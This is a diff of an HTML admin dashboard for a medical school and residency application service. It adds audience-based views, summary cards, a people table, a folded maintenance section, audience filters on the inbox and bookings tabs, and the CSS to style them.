@@ -1531,61 +1531,83 @@
         <div class="view" id="viewAdmin">
           <div class="dashboard-header">
             <h1>Admin Panel</h1>
-            <p class="dashboard-sub">Platform overview and user management.</p>
+            <p class="dashboard-sub" id="adminViewSub">Both audiences together: applicants, customers, revenue and everything that needs a reply.</p>
+          </div>
+
+          <!-- Audience selector. The three buttons are views of the SAME data
+               (one user list, one payment ledger); nothing is duplicated. -->
+          <div class="admin-audience-bar">
+            <div class="admin-audience-switch" role="group" aria-label="Choose which audience to view">
+              <button type="button" class="admin-audience-btn active" data-admin-view="overview" aria-pressed="true">Overview</button>
+              <button type="button" class="admin-audience-btn" data-admin-view="med-school" aria-pressed="false"><span class="aa-long">Med School Applicants</span><span class="aa-short">Med School</span></button>
+              <button type="button" class="admin-audience-btn" data-admin-view="residency" aria-pressed="false"><span class="aa-long">Residency Applicants</span><span class="aa-short">Residency</span></button>
+            </div>
+            <div class="admin-audience-banner" id="adminAudienceBanner" data-view="overview" aria-live="polite">
+              <span class="admin-audience-dot" aria-hidden="true"></span>
+              <span>Viewing: <strong id="adminAudienceName">Overview · all audiences</strong></span>
+            </div>
           </div>
 
           <!-- Admin Tabs -->
           <div class="admin-tabs">
             <button class="admin-tab active" data-admin-tab="dashboard">Dashboard</button>
-            <button class="admin-tab" data-admin-tab="inbox">Inbox <span class="admin-tab-badge" id="inboxBadge" style="display:none;">0</span></button>
+            <button class="admin-tab" data-admin-tab="inbox" title="Badge counts new messages across all audiences">Inbox <span class="admin-tab-badge" id="inboxBadge" style="display:none;">0</span></button>
             <button class="admin-tab" data-admin-tab="bookings">Bookings</button>
             <button class="admin-tab" data-admin-tab="calendar">Calendar</button>
           </div>
 
-          <!-- TAB: Dashboard (existing content) -->
+          <!-- TAB: Dashboard -->
           <div class="admin-tab-panel active" id="adminTabDashboard">
 
-          <!-- Shown when the live Firestore user stream errors out. Hidden
-               again automatically the next time the stream ticks OK. -->
-          <div id="adminStatsErrorBanner" role="status"
-               style="display:none; background:#FEF3C7; color:#78350F;
-                      border:1px solid #F59E0B; border-radius:10px;
-                      padding:10px 14px; margin-bottom:14px; font-size:0.92rem;">
+          <!-- Shown when a live data stream errors out. Hidden again
+               automatically the next time the stream ticks OK. -->
+          <div id="adminStatsErrorBanner" role="status" class="admin-alert" style="display:none;"></div>
+
+          <!-- Summary cards (rendered per view by renderAdminAudience) -->
+          <div class="admin-cards-head">
+            <h3 class="admin-section-title" id="adminCardsTitle">Summary</h3>
+            <label class="admin-period">
+              <span>Reporting period</span>
+              <select class="admin-filter" id="adminPeriodSelect" aria-label="Reporting period for customers and revenue">
+                <option value="all">All time</option>
+                <option value="month">This month</option>
+                <option value="30d">Last 30 days</option>
+              </select>
+            </label>
+          </div>
+          <div class="admin-cards" id="adminCards" aria-live="polite">
+            <div class="admin-card is-loading"><div class="admin-card-label">Loading</div><div class="admin-card-value">…</div></div>
+          </div>
+          <details class="admin-definitions" id="adminDefinitions">
+            <summary>What do these numbers mean?</summary>
+            <div id="adminDefinitionsBody"></div>
+          </details>
+
+          <div class="admin-grid-2">
+            <section class="admin-section admin-section-tight" id="adminAttentionSection">
+              <h3 class="admin-section-title">Needs attention</h3>
+              <div id="adminAttention" class="admin-list"><div class="admin-loading">Loading…</div></div>
+            </section>
+            <section class="admin-section admin-section-tight" id="adminUpcomingSection">
+              <h3 class="admin-section-title">Upcoming bookings <span class="admin-title-note">next 14 days</span></h3>
+              <div id="adminUpcoming" class="admin-list"><div class="admin-loading">Loading…</div></div>
+            </section>
           </div>
 
-          <!-- Quick Stats Cards -->
-          <div class="admin-stats-grid" id="adminStatsGrid">
-            <div class="admin-stat-card">
-              <div class="admin-stat-value" id="adminStatTotalUsers">-</div>
-              <div class="admin-stat-label">Total Users</div>
-            </div>
-            <div class="admin-stat-card">
-              <div class="admin-stat-value" id="adminStatNewUsers">-</div>
-              <div class="admin-stat-label">New This Month</div>
-            </div>
-            <div class="admin-stat-card">
-              <div class="admin-stat-value" id="adminStatPaidUsers">-</div>
-              <div class="admin-stat-label">Paying Users</div>
-            </div>
-            <div class="admin-stat-card">
-              <div class="admin-stat-value" id="adminStatRevenue">-</div>
-              <div class="admin-stat-label">Total Revenue</div>
-            </div>
-            <div class="admin-stat-card">
-              <div class="admin-stat-value" id="adminStatQbankUsers">-</div>
-              <div class="admin-stat-label">Active QBank Users</div>
-            </div>
-            <div class="admin-stat-card">
-              <div class="admin-stat-value" id="adminStatVisits">-</div>
-              <div class="admin-stat-label">Total Site Visits</div>
-              <div class="admin-stat-sub">Anonymous only</div>
-            </div>
+          <div class="admin-grid-2">
+            <section class="admin-section admin-section-tight" id="adminPurchasesSection">
+              <h3 class="admin-section-title">Recent purchases <span class="admin-title-note">live Stripe payments</span></h3>
+              <div id="adminRecentPurchases" class="admin-list"><div class="admin-loading">Loading…</div></div>
+            </section>
+            <section class="admin-section admin-section-tight" id="adminServicesSection">
+              <h3 class="admin-section-title" id="adminServicesTitle">Sales by product <span class="admin-title-note" id="adminServicesPeriod">all time</span></h3>
+              <div id="adminServices" class="admin-list"><div class="admin-loading">Loading…</div></div>
+            </section>
           </div>
 
-          <!-- Question Reports — promoted to top of admin dashboard so
-               new user-submitted issues are immediately visible. -->
-          <div class="admin-section">
-            <h3 class="admin-section-title">Question Reports</h3>
+          <!-- Question Reports — Med School only (QBank). -->
+          <div class="admin-section" data-admin-views="med-school" id="adminReportsSection">
+            <h3 class="admin-section-title">Question Reports <span class="admin-title-note">from QBank users</span></h3>
             <div id="adminReportsWrap">
               <div class="admin-loading" id="adminReportsLoading">Loading reports...</div>
               <div id="adminReportsList"></div>
@@ -1593,22 +1615,59 @@
             </div>
           </div>
 
-          <!-- Site Activity (visit charts: daily timeline + country breakdown).
-               Range selector lives INSIDE the Daily Visits card because it
-               only applies to that chart. Top Countries is cumulative (the
-               `_meta/visitsByCountry` doc stores all-time totals, no per-day
-               breakdown), so filtering it would require a data-schema
-               rewrite + backfill. Label it explicitly "(all time)" to
-               match reality. -->
-          <div class="admin-section">
+          <!-- People -->
+          <div class="admin-section" id="adminUsersSection">
             <div class="admin-section-header">
-              <h3 class="admin-section-title">Site Activity</h3>
-              <div class="admin-controls" style="display:flex; flex-direction:column; align-items:flex-end; gap:4px;">
-                <span style="font-size:0.75rem; color:#64748b; font-weight:500;">Anonymous visitors only &middot; signed-in users tracked per-user in User Management</span>
+              <h3 class="admin-section-title" id="adminUsersTitle">Applicants</h3>
+              <div class="admin-controls">
+                <input type="search" class="admin-search" id="adminUserSearch" placeholder="Search name or email" aria-label="Search by name or email">
+                <select class="admin-filter" id="adminUserFilter" aria-label="Filter people"></select>
+                <button class="admin-action-btn" onclick="exportUsersCsv()" title="Download the people shown here (this view, search and filter) as a spreadsheet">Export CSV</button>
               </div>
             </div>
-            <div style="display:grid; grid-template-columns:repeat(auto-fit, minmax(360px, 1fr)); gap:20px;">
-              <div style="background:#fff; border:1px solid #e5e7eb; border-radius:10px; padding:18px;">
+            <p class="admin-table-caption" id="adminUsersCaption"></p>
+            <div class="admin-table-wrap" id="adminUsersTableWrap">
+              <div class="admin-loading" id="adminUsersLoading">Loading users...</div>
+              <table class="admin-table" id="adminUsersTable" style="display:none;">
+                <thead id="adminUsersHead"></thead>
+                <tbody id="adminUsersBody"></tbody>
+              </table>
+              <div class="admin-pagination" id="adminPagination"></div>
+            </div>
+          </div>
+
+          <!-- Recent Activity -->
+          <div class="admin-section">
+            <h3 class="admin-section-title">Recent Activity</h3>
+            <div class="admin-activity-grid">
+              <div class="admin-activity-col">
+                <h4 class="admin-activity-heading">Recent sign-ups</h4>
+                <div id="adminRecentSignups" class="admin-activity-list">
+                  <div class="admin-loading">Loading...</div>
+                </div>
+              </div>
+              <div class="admin-activity-col" data-admin-views="med-school">
+                <h4 class="admin-activity-heading">Recent QBank tests</h4>
+                <div id="adminRecentTests" class="admin-activity-list">
+                  <div class="admin-loading">Loading...</div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Site Activity — Overview only. Site-wide numbers: visits are not
+               tagged by audience, so they are never split per view.
+               Top Countries is cumulative (the `_meta/visitsByCountry` doc
+               stores all-time totals, no per-day breakdown). -->
+          <div class="admin-section" data-admin-views="overview">
+            <div class="admin-section-header">
+              <h3 class="admin-section-title">Site Activity <span class="admin-title-note">site-wide</span></h3>
+              <div class="admin-controls" style="display:flex; flex-direction:column; align-items:flex-end; gap:4px;">
+                <span style="font-size:0.75rem; color:#64748b; font-weight:500;">Anonymous visitors only &middot; signed-in users tracked per-user in the people table</span>
+              </div>
+            </div>
+            <div class="admin-visits-grid">
+              <div class="admin-chart-card">
                 <div style="display:flex; justify-content:space-between; align-items:center; gap:12px; margin-bottom:14px; flex-wrap:wrap;">
                   <div style="display:flex; align-items:baseline; gap:10px; flex-wrap:wrap;">
                     <h4 style="margin:0; font-size:0.95rem; color:#0f172a;">Daily visits</h4>
@@ -1624,7 +1683,7 @@
                   <canvas id="visitsDailyChart" aria-label="Daily visits chart" role="img"></canvas>
                 </div>
               </div>
-              <div style="background:#fff; border:1px solid #e5e7eb; border-radius:10px; padding:18px;">
+              <div class="admin-chart-card">
                 <div style="display:flex; justify-content:space-between; align-items:baseline; gap:12px; margin-bottom:14px; flex-wrap:wrap;">
                   <div style="display:flex; align-items:baseline; gap:10px; flex-wrap:wrap;">
                     <h4 style="margin:0; font-size:0.95rem; color:#0f172a;">Top countries</h4>
@@ -1640,62 +1699,26 @@
             <p id="visitsEmpty" style="display:none; text-align:center; color:#9ca3af; padding:24px;">No visit data yet. Visits are only recorded from ANONYMOUS visitors (signed-in users are tracked per-user in User Management). Open the site in an Incognito window to test.</p>
           </div>
 
-          <!-- User Management -->
-          <div class="admin-section">
-            <div class="admin-section-header">
-              <h3 class="admin-section-title">User Management</h3>
-              <div class="admin-controls">
-                <input type="text" class="admin-search" id="adminUserSearch" placeholder="Search by name or email...">
-                <select class="admin-filter" id="adminUserFilter">
-                  <option value="all">All Users</option>
-                  <option value="applicant">Applicants</option>
-                  <option value="student">Students</option>
-                  <option value="paid">Paid</option>
-                  <option value="free">Free</option>
-                </select>
-                <button class="admin-action-btn admin-btn-grant" onclick="exportUsersCsv()">Export CSV</button>
-                <button class="admin-action-btn" style="background:#fef3c7; color:#92400e; border-color:#fde68a;" onclick="cleanupOrphanProfiles()" title="Delete Firestore /users/{uid} docs whose Firebase Auth account no longer exists">Clean Orphans</button>
-                <button class="admin-action-btn" style="background:#ecfdf5; color:#065f46; border-color:#a7f3d0;" onclick="reconcileStripePayments()" title="Compare paid Stripe checkouts with the payment ledger and record any that are missing. Shows a dry run first; nothing is written until you confirm.">Reconcile Payments</button>
-              </div>
-            </div>
-            <div class="admin-table-wrap" id="adminUsersTableWrap">
-              <div class="admin-loading" id="adminUsersLoading">Loading users...</div>
-              <table class="admin-table" id="adminUsersTable" style="display:none;">
-                <thead>
-                  <tr>
-                    <th>Name</th>
-                    <th>Email</th>
-                    <th>Path</th>
-                    <th>Signed Up</th>
-                    <th title="Total sessions on the site since visit tracking was added">Visits</th>
-                    <th>QBank Status</th>
-                    <th>Actions</th>
-                  </tr>
-                </thead>
-                <tbody id="adminUsersBody"></tbody>
-              </table>
-              <div class="admin-pagination" id="adminPagination"></div>
-            </div>
-          </div>
-
-          <!-- Recent Activity -->
-          <div class="admin-section">
-            <h3 class="admin-section-title">Recent Activity</h3>
-            <div class="admin-activity-grid">
-              <div class="admin-activity-col">
-                <h4 class="admin-activity-heading">Recent Signups</h4>
-                <div id="adminRecentSignups" class="admin-activity-list">
-                  <div class="admin-loading">Loading...</div>
+          <!-- Maintenance — Overview only, folded away from everyday controls. -->
+          <details class="admin-section admin-maintenance" data-admin-views="overview">
+            <summary><span class="admin-section-title">Maintenance tools</span> <span class="admin-title-note">occasional, admin-only</span></summary>
+            <div class="admin-maintenance-body">
+              <div class="admin-maintenance-item">
+                <div>
+                  <strong>Reconcile payments with Stripe</strong>
+                  <p>Checks Stripe for paid checkouts that are missing from the payment records. Shows you the list first; nothing is recorded until you confirm, and a payment can never be recorded twice.</p>
                 </div>
+                <button class="admin-action-btn admin-btn-grant" onclick="reconcileStripePayments()">Reconcile Payments</button>
               </div>
-              <div class="admin-activity-col">
-                <h4 class="admin-activity-heading">Recent QBank Tests</h4>
-                <div id="adminRecentTests" class="admin-activity-list">
-                  <div class="admin-loading">Loading...</div>
+              <div class="admin-maintenance-item">
+                <div>
+                  <strong>Clean orphaned profiles</strong>
+                  <p>Deletes profile records whose sign-in account no longer exists. Asks for confirmation first.</p>
                 </div>
+                <button class="admin-action-btn admin-btn-revoke" onclick="cleanupOrphanProfiles()">Clean Orphans</button>
               </div>
             </div>
-          </div>
+          </details>
 
           </div><!-- /adminTabDashboard -->
 
@@ -1711,6 +1734,13 @@
                     <option value="read">Read</option>
                     <option value="replied">Replied</option>
                     <option value="resolved">Resolved</option>
+                  </select>
+                  <select class="admin-filter" id="inboxAudienceFilter" data-admin-views="overview" aria-label="Filter by audience">
+                    <option value="all">All audiences</option>
+                    <option value="med-school">Med School</option>
+                    <option value="residency">Residency</option>
+                    <option value="shared">Shared (both)</option>
+                    <option value="unassigned">Unassigned</option>
                   </select>
                   <select class="admin-filter" id="inboxCategoryFilter">
                     <option value="all">All Categories</option>
@@ -1732,6 +1762,7 @@
                 <button class="admin-action-btn admin-btn-revoke" onclick="bulkDeleteSelectedMessages()">Delete Selected</button>
                 <button class="admin-action-btn" onclick="clearInboxSelection()">Clear</button>
               </div>
+              <p class="admin-table-caption" id="inboxAudienceNote"></p>
               <div id="inboxLoading" class="admin-loading">Loading messages...</div>
               <div id="inboxList"></div>
               <div id="inboxEmpty" class="admin-empty-msg" style="display:none;">No messages found.</div>
@@ -1744,6 +1775,13 @@
               <div class="admin-section-header">
                 <h3 class="admin-section-title">Service Bookings</h3>
                 <div class="admin-controls">
+                  <select class="admin-filter" id="bookingAudienceFilter" data-admin-views="overview" aria-label="Filter by audience">
+                    <option value="all">All audiences</option>
+                    <option value="med-school">Med School</option>
+                    <option value="residency">Residency</option>
+                    <option value="shared">Shared (both)</option>
+                    <option value="unclassified">Unclassified</option>
+                  </select>
                   <select class="admin-filter" id="bookingStatusFilter">
                     <option value="all">All Bookings</option>
                     <option value="inquiry">Inquiry</option>
@@ -1756,6 +1794,7 @@
                   </select>
                 </div>
               </div>
+              <p class="admin-table-caption" id="bookingAudienceNote"></p>
               <div id="bookingsLoading" class="admin-loading">Loading bookings...</div>
               <div id="bookingsList"></div>
               <div id="bookingsEmpty" class="admin-empty-msg" style="display:none;">No bookings found.</div>
@@ -1770,6 +1809,7 @@
                 <h3 class="admin-section-title" id="calMonthLabel" style="margin:0;"></h3>
                 <button class="admin-action-btn" id="calNext">Next &raquo;</button>
               </div>
+              <p class="admin-table-caption" id="calendarAudienceNote"></p>
               <div class="calendar-grid" id="calendarGrid"></div>
               <div id="calDayDetail" style="display:none; margin-top:16px;">
                 <div style="display:flex; align-items:center; justify-content:space-between; margin-bottom:12px; flex-wrap:wrap; gap:8px;">
@@ -2526,6 +2566,236 @@
     .admin-tab.active .admin-tab-badge { background: #ef4444; }
     .admin-tab-panel { display: none; }
     .admin-tab-panel.active { display: block; }
+
+    /* ===== Admin audience views (Overview / Med School / Residency) ===== */
+    #viewAdmin [hidden] { display: none !important; }
+    #viewAdmin .admin-activity-grid { grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); }
+    #viewAdmin .admin-section > .admin-section-title { margin-bottom: 14px; }
+    /* The content column is a grid item; without this it grows to the people
+       table's natural width and the whole page scrolls sideways. Scoped to
+       the Admin Panel so no other view's layout changes. */
+    .dashboard-main:has(#viewAdmin.active) { min-width: 0; }
+    #viewAdmin { min-width: 0; }
+    .admin-audience-bar {
+      display: flex; align-items: center; justify-content: space-between;
+      gap: 12px 20px; flex-wrap: wrap; margin: 4px 0 18px;
+    }
+    .admin-audience-switch {
+      display: inline-flex; background: #fff; border: 1px solid #e5e7eb;
+      border-radius: 999px; padding: 4px; gap: 4px; box-shadow: var(--shadow, 0 1px 3px rgba(0,0,0,.08));
+    }
+    .admin-audience-btn {
+      border: 0; background: transparent; color: #475569; font: inherit;
+      font-size: 0.9rem; font-weight: 600; padding: 9px 18px; border-radius: 999px;
+      cursor: pointer; transition: background .15s, color .15s; white-space: nowrap;
+    }
+    .admin-audience-btn:hover { background: #f1f5f9; color: var(--navy, #1B2137); }
+    .admin-audience-btn:focus-visible { outline: 2px solid var(--accent, #CF5B2E); outline-offset: 2px; }
+    .admin-audience-btn.active { background: var(--navy, #1B2137); color: #fff; }
+    .admin-audience-btn[data-admin-view="med-school"].active { background: #1d4ed8; }
+    .admin-audience-btn[data-admin-view="residency"].active { background: #047857; }
+    .admin-audience-btn .aa-short { display: none; }
+    .admin-audience-banner {
+      display: inline-flex; align-items: center; gap: 8px; font-size: 0.85rem;
+      color: #334155; padding: 7px 14px; border-radius: 999px; background: #f1f5f9;
+      border: 1px solid #e2e8f0;
+    }
+    .admin-audience-banner strong { color: var(--navy, #1B2137); }
+    .admin-audience-dot { width: 9px; height: 9px; border-radius: 50%; background: var(--navy, #1B2137); flex: none; }
+    .admin-audience-banner[data-view="med-school"] { background: #eff6ff; border-color: #bfdbfe; }
+    .admin-audience-banner[data-view="med-school"] .admin-audience-dot { background: #1d4ed8; }
+    .admin-audience-banner[data-view="residency"] { background: #ecfdf5; border-color: #a7f3d0; }
+    .admin-audience-banner[data-view="residency"] .admin-audience-dot { background: #047857; }
+
+    .admin-alert {
+      background: #FEF3C7; color: #78350F; border: 1px solid #F59E0B;
+      border-radius: 10px; padding: 10px 14px; margin-bottom: 14px; font-size: 0.92rem;
+    }
+
+    /* Summary cards */
+    .admin-cards-head {
+      display: flex; align-items: flex-end; justify-content: space-between;
+      gap: 12px; flex-wrap: wrap; margin-bottom: 12px;
+    }
+    .admin-period { display: inline-flex; align-items: center; gap: 8px; font-size: 0.8rem; color: #64748b; font-weight: 500; }
+    .admin-cards {
+      display: grid; grid-template-columns: repeat(auto-fit, minmax(190px, 1fr));
+      gap: 14px; margin-bottom: 10px;
+    }
+    .admin-card {
+      background: #fff; border: 1px solid #e5e7eb; border-radius: 12px;
+      padding: 16px 18px; min-width: 0; display: flex; flex-direction: column; gap: 4px;
+    }
+    .admin-card-accent { border-top: 3px solid var(--accent, #CF5B2E); }
+    .admin-card-label {
+      font-size: 0.72rem; font-weight: 700; letter-spacing: .06em;
+      text-transform: uppercase; color: #64748b;
+    }
+    .admin-card-value {
+      font-family: 'Playfair Display', Georgia, serif; font-size: 1.9rem; font-weight: 700;
+      color: var(--navy, #1B2137); line-height: 1.15; font-variant-numeric: tabular-nums;
+    }
+    .admin-card-sub { font-size: 0.78rem; color: #64748b; line-height: 1.35; }
+    .admin-card.is-loading .admin-card-value { color: #cbd5e1; }
+    .admin-card.is-error { border-color: #fecaca; background: #fff7f7; }
+    .admin-card.is-error .admin-card-value { color: #b91c1c; }
+    .aa-warn { color: #b45309; font-weight: 600; }
+
+    .admin-definitions {
+      margin: 0 0 22px; font-size: 0.85rem; color: #475569;
+      background: #fff; border: 1px solid #e5e7eb; border-radius: 10px; padding: 0 16px;
+    }
+    .admin-definitions summary { cursor: pointer; padding: 11px 0; font-weight: 600; color: var(--navy, #1B2137); }
+    .admin-definitions dl { margin: 0 0 14px; display: grid; grid-template-columns: max-content 1fr; gap: 8px 16px; }
+    .admin-definitions dt { font-weight: 600; color: var(--navy, #1B2137); }
+    .admin-definitions dd { margin: 0; line-height: 1.5; }
+
+    /* Two-up section grid */
+    .admin-grid-2 { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 20px; margin-bottom: 4px; }
+    .admin-grid-2 > .admin-section { margin-bottom: 20px; }
+    .admin-section-tight { padding: 20px 22px; }
+    .admin-section-tight .admin-section-title { margin-bottom: 12px; }
+    .admin-title-note { font-family: Inter, system-ui, sans-serif; font-size: 0.75rem; font-weight: 500; color: #94a3b8; margin-left: 6px; }
+    .admin-list { display: flex; flex-direction: column; }
+
+    /* List rows (purchases, bookings, attention) */
+    .aa-row {
+      display: flex; align-items: flex-start; justify-content: space-between; gap: 12px;
+      padding: 10px 0; border-bottom: 1px solid #f1f5f9; font-size: 0.88rem;
+    }
+    .aa-row:last-child { border-bottom: 0; }
+    .aa-row-compact { padding: 6px 0; }
+    .aa-row-main { min-width: 0; }
+    .aa-row-main strong { color: var(--navy, #1B2137); font-weight: 600; }
+    .aa-row-meta { color: #64748b; font-size: 0.8rem; margin-top: 2px; overflow-wrap: anywhere; }
+    .aa-row-side { text-align: right; display: flex; flex-direction: column; align-items: flex-end; gap: 4px; font-size: 0.82rem; color: #475569; flex: none; }
+    .aa-amount { font-weight: 700; color: var(--navy, #1B2137); font-variant-numeric: tabular-nums; }
+    .aa-amount s { color: #94a3b8; font-weight: 500; margin-right: 4px; }
+    .aa-more { font-size: 0.8rem; color: #64748b; padding-top: 8px; }
+    .aa-muted { color: #94a3b8; font-size: 0.82rem; }
+
+    .aa-attn {
+      display: flex; align-items: center; gap: 12px; width: 100%; text-align: left;
+      background: #fff; border: 1px solid #e5e7eb; border-radius: 10px; padding: 10px 12px;
+      margin-bottom: 8px; font: inherit; font-size: 0.88rem; color: #334155; cursor: pointer;
+      transition: border-color .15s, background .15s;
+    }
+    .aa-attn:hover:not(:disabled) { border-color: var(--accent, #CF5B2E); background: #fffaf7; }
+    .aa-attn:disabled { cursor: default; }
+    .aa-attn-count {
+      min-width: 30px; height: 30px; border-radius: 8px; display: inline-flex; align-items: center;
+      justify-content: center; background: #fef3e8; color: var(--accent-dark, #A84823); font-weight: 700;
+    }
+    .aa-attn-label { flex: 1; }
+    .aa-attn-go { color: #94a3b8; font-size: 1.2rem; }
+
+    /* Chips and badges */
+    .aa-chip, .aa-status, .aa-access {
+      display: inline-block; padding: 2px 9px; border-radius: 999px; font-size: 0.72rem;
+      font-weight: 600; white-space: nowrap; vertical-align: middle; line-height: 1.5;
+    }
+    .aa-chip-med-school { background: #dbeafe; color: #1d4ed8; }
+    .aa-chip-residency { background: #d1fae5; color: #065f46; }
+    .aa-chip-shared { background: #e2e8f0; color: #334155; }
+    .aa-chip-unassigned { background: #fef3c7; color: #92400e; }
+    .aa-chip-unclassified { background: #fee2e2; color: #991b1b; }
+    .aa-status-paid { background: #d1fae5; color: #065f46; }
+    .aa-status-partial { background: #fef3c7; color: #92400e; }
+    .aa-status-refunded { background: #f1f5f9; color: #64748b; text-decoration: line-through; text-decoration-color: #94a3b8; }
+    .aa-status-test { background: #f1f5f9; color: #64748b; }
+    .aa-access-purchased { background: #d1fae5; color: #065f46; }
+    .aa-access-comp { background: #ede9fe; color: #5b21b6; }
+    .aa-access-staff { background: #fef3c7; color: #92400e; }
+    .aa-access-none { background: #f3f4f6; color: #6b7280; }
+    .aa-path-applicant { background: #dbeafe; color: #1d4ed8; }
+    .aa-path-student { background: #d1fae5; color: #065f46; }
+    .aa-path-both { background: linear-gradient(90deg, #dbeafe 50%, #d1fae5 50%); color: #1e3a5f; }
+    .aa-path-none { background: #FEF3C7; color: #92400E; }
+    .aa-path { font-size: 0.75rem; color: #64748b; margin-left: 4px; }
+
+    /* People table */
+    .admin-table-caption { font-size: 0.8rem; color: #64748b; margin: -6px 0 10px; }
+    #adminUsersTable td { vertical-align: top; }
+    .aa-name { font-weight: 600; color: var(--navy, #1B2137); }
+    .aa-email { font-size: 0.8rem; color: #64748b; overflow-wrap: anywhere; }
+    .aa-person { min-width: 190px; }
+    /* Wide enough that columns never squeeze; on narrow screens the table
+       scrolls sideways inside .admin-table-wrap instead. */
+    #adminUsersTable { min-width: 720px; }
+    .aa-purchase { font-size: 0.82rem; margin-bottom: 3px; line-height: 1.4; }
+    .aa-purchase .aa-status { margin-top: 1px; }
+    .aa-actions { white-space: nowrap; }
+    #adminUsersTable .aa-access { white-space: normal; max-width: 170px; }
+    .aa-actions .admin-action-btn { margin: 0 4px 4px 0; }
+    .aa-table-empty { text-align: center; color: #9ca3af; padding: 28px !important; }
+
+    .aa-mini-table { width: 100%; border-collapse: collapse; font-size: 0.84rem; }
+    .aa-mini-table th { text-align: left; font-size: 0.72rem; font-weight: 700; letter-spacing: .04em; text-transform: uppercase; color: #64748b; padding: 6px 8px; border-bottom: 1px solid #e5e7eb; }
+    .aa-mini-table td { padding: 8px; border-bottom: 1px solid #f1f5f9; vertical-align: middle; }
+    .aa-mini-table tr:last-child td { border-bottom: 0; }
+    .aa-mini-table .num { text-align: right; font-variant-numeric: tabular-nums; white-space: nowrap; }
+
+    /* User details */
+    .admin-user-details { line-height: 1.5; }
+    .aa-details { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 14px 20px; padding: 6px 2px; }
+    .aa-detail-block { background: #fff; border: 1px solid #e5e7eb; border-radius: 10px; padding: 12px 14px; min-width: 0; }
+    .aa-detail-block h5 { margin: 0 0 8px; font-size: 0.72rem; letter-spacing: .06em; text-transform: uppercase; color: #64748b; }
+    .aa-detail-wide { grid-column: 1 / -1; overflow-x: auto; }
+    .aa-kv { display: grid; grid-template-columns: 130px 1fr; gap: 10px; padding: 4px 0; font-size: 0.85rem; }
+    .aa-kv > span:first-child { color: #64748b; }
+    .aa-kv code { font-size: 0.78rem; overflow-wrap: anywhere; }
+    .aa-note { font-size: 0.78rem; color: #64748b; margin: 8px 0 0; }
+    .aa-inline-actions { display: inline-flex; gap: 6px; margin-left: 10px; flex-wrap: wrap; }
+    .aa-toggle-on { background: var(--navy, #1B2137) !important; color: #fff !important; border-color: var(--navy, #1B2137) !important; }
+    .aa-technical summary { cursor: pointer; font-size: 0.8rem; font-weight: 600; color: #64748b; }
+    .aa-technical[open] summary { margin-bottom: 8px; }
+    .aa-danger {
+      grid-column: 1 / -1; display: flex; align-items: center; justify-content: space-between; gap: 16px;
+      border: 1px solid #fecaca; background: #fff7f7; border-radius: 10px; padding: 12px 14px;
+    }
+    .aa-danger strong { color: #991b1b; }
+    .aa-danger p { margin: 2px 0 0; font-size: 0.8rem; color: #7f1d1d; }
+    .aa-btn-danger { background: #fff; color: #b91c1c; border-color: #fca5a5; }
+    .aa-btn-danger:hover { background: #dc2626 !important; color: #fff; border-color: #dc2626 !important; }
+
+    /* Site activity + maintenance */
+    .admin-visits-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 20px; }
+    .admin-chart-card { background: #fff; border: 1px solid #e5e7eb; border-radius: 10px; padding: 18px; min-width: 0; }
+    .admin-maintenance summary { cursor: pointer; list-style: none; display: flex; align-items: baseline; gap: 6px; }
+    .admin-maintenance summary::-webkit-details-marker { display: none; }
+    .admin-maintenance summary::before { content: '▸'; color: #94a3b8; margin-right: 6px; transition: transform .15s; display: inline-block; }
+    .admin-maintenance[open] summary::before { transform: rotate(90deg); }
+    .admin-maintenance-body { margin-top: 14px; display: flex; flex-direction: column; gap: 10px; }
+    .admin-maintenance-item {
+      display: flex; align-items: center; justify-content: space-between; gap: 16px;
+      border: 1px solid #e5e7eb; border-radius: 10px; padding: 12px 14px;
+    }
+    .admin-maintenance-item p { margin: 3px 0 0; font-size: 0.82rem; color: #64748b; }
+
+    @media (max-width: 1000px) {
+      .admin-grid-2 { grid-template-columns: 1fr; gap: 0; }
+      .aa-details { grid-template-columns: 1fr; }
+    }
+    @media (max-width: 640px) {
+      .admin-audience-bar { flex-direction: column; align-items: stretch; }
+      .admin-audience-switch { display: flex; }
+      .admin-audience-btn { flex: 1; padding: 9px 8px; font-size: 0.85rem; }
+      .admin-audience-btn .aa-long { display: none; }
+      .admin-audience-btn .aa-short { display: inline; }
+      .admin-audience-banner { justify-content: center; }
+      .admin-cards { grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 10px; }
+      .admin-card { padding: 12px 14px; }
+      .admin-card-value { font-size: 1.5rem; }
+      .admin-section, .admin-section-tight { padding: 16px; }
+      .admin-controls { width: 100%; }
+      .admin-search { min-width: 0; flex: 1 1 100%; }
+      .admin-definitions dl { grid-template-columns: 1fr; gap: 2px; }
+      .admin-definitions dd { margin-bottom: 8px; }
+      .aa-kv { grid-template-columns: 1fr; gap: 0; }
+      .aa-danger, .admin-maintenance-item { flex-direction: column; align-items: flex-start; }
+      .admin-visits-grid { grid-template-columns: 1fr; }
+    }
+    @media (max-width: 380px) { .admin-cards { grid-template-columns: 1fr; } }
 
     /* ===== Contact Form Styles ===== */
     .form-row { display: flex; gap: 16px; flex-wrap: wrap; }
@@ -3854,8 +4124,10 @@
        block other dashboard rendering for non-admin users. -->
   <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.1/dist/chart.umd.min.js"></script>
   <script src="auth.js?v=20260718-visitv5"></script>
-  <script src="contact-booking.js?v=20260917-ledger"></script>
-  <script src="revenue-stats.js?v=20260917-ledger"></script>
+  <script src="contact-booking.js?v=20260918-audience"></script>
+  <script src="revenue-stats.js?v=20260918-audience"></script>
+  <script src="product-catalog.js?v=20260918-audience"></script>
+  <script src="admin-audience.js?v=20260918-audience"></script>
   <script>
     let currentProfile = null;
     let currentUser = null;
@@ -5815,6 +6087,7 @@
     async function loadAdminPanel() {
       if (adminDataLoaded) return;
       adminDataLoaded = true;
+      initAdminAudienceControls();
       // loadAdminUsers must finish BEFORE loadQuestionReports starts so the
       // reports panel can look up reporter emails from the merged user cache
       // (allAdminUsers includes Auth emails, not just Firestore profile
@@ -5834,6 +6107,8 @@
     // ===== Admin Stats (real-time via onSnapshot) =====
     let adminUsersStreamUnsub = null;
     let adminTransactionsStreamUnsub = null;
+    let adminDashBookingsUnsub = null;
+    let adminDashMessagesUnsub = null;
     let adminVisitsStreamUnsub = null;
     let adminVisitsByDayUnsub = null;
     let adminVisitsByCountryUnsub = null;
